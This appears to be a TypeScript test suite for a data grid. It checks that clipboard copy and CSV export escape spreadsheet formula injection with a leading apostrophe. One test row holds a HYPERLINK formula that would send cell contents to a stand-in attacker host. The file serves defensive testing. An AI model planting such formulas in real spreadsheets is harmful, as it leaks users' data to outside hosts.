import { expect, fixture, fixtureCleanup, html, nextFrame } from '@open-wc/testing';
import type { ColumnConfiguration } from 'apex-grid';
import {
  CONTEXT_MENU_MODULE_ID,
  type ContextMenuController,
} from '../src/features/context-menu.js';
import {
  RANGE_SELECTION_MODULE_ID,
  type RangeSelectionController,
} from '../src/features/range-selection.js';
import { ApexGridEnterprise, enterpriseModules } from '../src/index.js';

// ent-range-a-10 and sweep-security-3: range copy and the context-menu Copy
// item put formula-leading text on the clipboard with a leading apostrophe,
// as CSV export does, while an in-grid copy and paste stays lossless and the
// formula-source CSV export keeps its formulas.

interface Row {
  id: number; // A
  name: string; // B
  qty: number; // C
  total: number; // D
}

const columns: ColumnConfiguration<Row>[] = [
  { key: 'id', type: 'number', editable: true },
  { key: 'name', type: 'string', editable: true },
  { key: 'qty', type: 'number', editable: true },
  { key: 'total', type: 'number', editable: true, allowFormula: true },
];

function rows(): Row[] {
  return [
    { id: -1, name: '=HYPERLINK("https://evil.test/?"&A2,"x")', qty: 2, total: 0 },
    { id: 2, name: '-note', qty: 3, total: 0 },
    { id: 3, name: '-5', qty: 4, total: 0 },
    { id: 4, name: 'plain', qty: 5, total: 0 },
  ];
}

async function mount(data: Row[]): Promise<ApexGridEnterprise<Row>> {
  const parent = document.createElement('div');
  parent.style.height = '600px';
  const grid = await fixture<ApexGridEnterprise<Row>>(
    html`<apex-grid-enterprise
      .data=${data}
      .columns=${columns}
      .editing=${{ enabled: true }}
    ></apex-grid-enterprise>`,
    { parentNode: parent }
  );
  await grid.updateComplete;
  await nextFrame();
  return grid;
}

function moduleOf<C>(grid: ApexGridEnterprise<Row>, id: string): C {
  return (grid as unknown as { stateController: { module(id: string): C } }).stateController.module(
    id
  );
}

/** Runs `body` with a stubbed `navigator.clipboard`, returning what it wrote. */
async function withClipboard(body: () => Promise<void> | void): Promise<string[]> {
  const writes: string[] = [];
  const original = Object.getOwnPropertyDescriptor(navigator, 'clipboard');
  Object.defineProperty(navigator, 'clipboard', {
    configurable: true,
    value: {
      writeText: async (text: string) => {
        writes.push(text);
      },
      readText: async () => writes[writes.length - 1] ?? '',
    },
  });
  try {
    await body();
  } finally {
    if (original) Object.defineProperty(navigator, 'clipboard', original);
    else Reflect.deleteProperty(navigator as unknown as Record<string, unknown>, 'clipboard');
  }
  return writes;
}

describe('formula injection on copy and export', () => {
  before(() => {
    ApexGridEnterprise.use(...enterpriseModules);
    ApexGridEnterprise.register();
  });
  afterEach(() => fixtureCleanup());

  describe('range copy', () => {
    it('prefixes formula-leading text with an apostrophe', async () => {
      const grid = await mount(rows());
      grid.selectRange({ row: 0, column: 'id' }, { row: 3, column: 'name' });
      expect(grid.getSelectionTSV().split('\n')).to.deep.equal([
        `-1\t"'=HYPERLINK(""https://evil.test/?""&A2,""x"")"`,
        "2\t'-note",
        '3\t-5',
        '4\tplain',
      ]);
      const writes = await withClipboard(async () => {
        expect(await grid.copySelection()).to.be.true;
      });
      expect(writes[0]).to.equal(grid.getSelectionTSV());
    });

    it('writes raw text when escapeFormulas is off', async () => {
      const grid = await mount(rows());
      moduleOf<RangeSelectionController<Row>>(grid, RANGE_SELECTION_MODULE_ID).escapeFormulas =
        false;
      grid.selectRange({ row: 1, column: 'name' });
      expect(grid.getSelectionTSV()).to.equal('-note');
    });

    it('an in-grid copy and paste stores the original text', async () => {
      const data = rows();
      const grid = await mount(data);
      await withClipboard(async () => {
        grid.selectRange({ row: 0, column: 'name' }, { row: 1, column: 'name' });
        await grid.copySelection();
        grid.selectRange({ row: 2, column: 'name' });
        await moduleOf<RangeSelectionController<Row>>(
          grid,
          RANGE_SELECTION_MODULE_ID
        ).pasteFromClipboard();
      });
      expect(data[2].name).to.equal(data[0].name);
      expect(data[3].name).to.equal('-note');
    });

    it('an in-grid copy keeps formula re-offsetting alongside escaped text', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.setFormula(data[0], 'total', '=C1*2');
      await withClipboard(async () => {
        grid.selectRange({ row: 0, column: 'name' }, { row: 0, column: 'total' });
        await grid.copySelection();
        grid.selectRange({ row: 1, column: 'name' });
        await moduleOf<RangeSelectionController<Row>>(
          grid,
          RANGE_SELECTION_MODULE_ID
        ).pasteFromClipboard();
      });
      expect(data[1].name).to.equal(data[0].name);
      expect(grid.getFormula(data[1], 'total')).to.equal('=C2*2');
      expect(data[1].total).to.equal(4);
    });

    it('a selection change during the clipboard write keeps the copied text', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.setFormula(data[0], 'total', '=C1*2');
      const range = moduleOf<RangeSelectionController<Row>>(grid, RANGE_SELECTION_MODULE_ID);
      let release = () => {};
      const writes: string[] = [];
      await withClipboard(async () => {
        Object.assign(navigator.clipboard, {
          writeText: (text: string) =>
            new Promise<void>((resolve) => {
              writes.push(text);
              release = resolve;
            }),
        });
        grid.selectRange({ row: 0, column: 'name' }, { row: 0, column: 'total' });
        const copied = grid.copySelection();
        grid.selectRange({ row: 1, column: 'name' }, { row: 1, column: 'total' });
        release();
        expect(await copied).to.be.true;
        grid.selectRange({ row: 3, column: 'name' });
        range.pasteText(writes[0]);
      });
      expect(data[3].name).to.equal(data[0].name);
      expect(grid.getFormula(data[3], 'total')).to.equal('=C4*2');
    });

    it('an in-grid paste whose line breaks came back as CRLF stays lossless', async () => {
      const data = rows();
      const grid = await mount(data);
      const writes = await withClipboard(async () => {
        grid.selectRange({ row: 0, column: 'name' }, { row: 1, column: 'name' });
        await grid.copySelection();
      });
      grid.selectRange({ row: 2, column: 'name' });
      grid.pasteText(writes[0].replace(/\n/g, '\r\n'));
      expect(data[2].name).to.equal(data[0].name);
      expect(data[3].name).to.equal('-note');
    });

    it('pasted text from elsewhere is kept as typed', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.selectRange({ row: 3, column: 'name' });
      grid.pasteText("'-note");
      expect(data[3].name).to.equal("'-note");
    });
  });

  describe('context menu copy', () => {
    async function copyCell(grid: ApexGridEnterprise<Row>, row: number): Promise<string> {
      const menu = moduleOf<ContextMenuController<Row>>(grid, CONTEXT_MENU_MODULE_ID);
      const target = {
        kind: 'cell',
        column: columns[1],
        row: grid.data[row],
        rowIndex: row,
      } as const;
      const item = menu.defaultItems(target).find((candidate) => candidate.id === 'copy');
      const writes = await withClipboard(() => item?.run?.(target));
      return writes[0];
    }

    it('prefixes formula-leading text with an apostrophe', async () => {
      const grid = await mount(rows());
      expect(await copyCell(grid, 1)).to.equal("'-note");
      expect(await copyCell(grid, 2)).to.equal('-5');
    });

    it('follows the range selection opt-out', async () => {
      const grid = await mount(rows());
      moduleOf<RangeSelectionController<Row>>(grid, RANGE_SELECTION_MODULE_ID).escapeFormulas =
        false;
      expect(await copyCell(grid, 1)).to.equal('-note');
    });
  });

  describe('exportToCSV({ formulas: true })', () => {
    it('keeps formula sources and escapes other text', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.setFormula(data[0], 'total', '=C1*2');
      const lines = grid
        .exportToCSV({ filename: '', bom: false, formulas: true, columns: ['name', 'total'] })
        .split('\r\n');
      expect(lines[1]).to.equal(`"'=HYPERLINK(""https://evil.test/?""&A2,""x"")",=C1*2`);
      expect(lines[2]).to.equal("'-note,0");
    });

    it('escapes header labels too', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.columns = columns.map((c) => (c.key === 'name' ? { ...c, headerText: '=HDR()' } : c));
      await grid.updateComplete;
      grid.setFormula(data[0], 'total', '=C1*2');
      const lines = grid
        .exportToCSV({ filename: '', bom: false, formulas: true, columns: ['name', 'total'] })
        .split('\r\n');
      expect(lines[0]).to.equal("'=HDR(),total");
      expect(lines[1]).to.match(/,=C1\*2$/);
    });

    it('writes all text raw with escapeFormulas: false', async () => {
      const data = rows();
      const grid = await mount(data);
      grid.setFormula(data[0], 'total', '=C1*2');
      const csv = grid.exportToCSV({
        filename: '',
        bom: false,
        formulas: true,
        escapeFormulas: false,
        columns: ['name', 'total'],
      });
      expect(csv.split('\r\n')[2]).to.equal('-note,0');
    });

    it('escapes text cells in the plain export', async () => {
      const grid = await mount(rows());
      const csv = grid.exportToCSV({ filename: '', bom: false, columns: ['name'] });
      expect(csv.split('\r\n').slice(2)).to.deep.equal(["'-note", '-5', 'plain']);
    });
  });
});
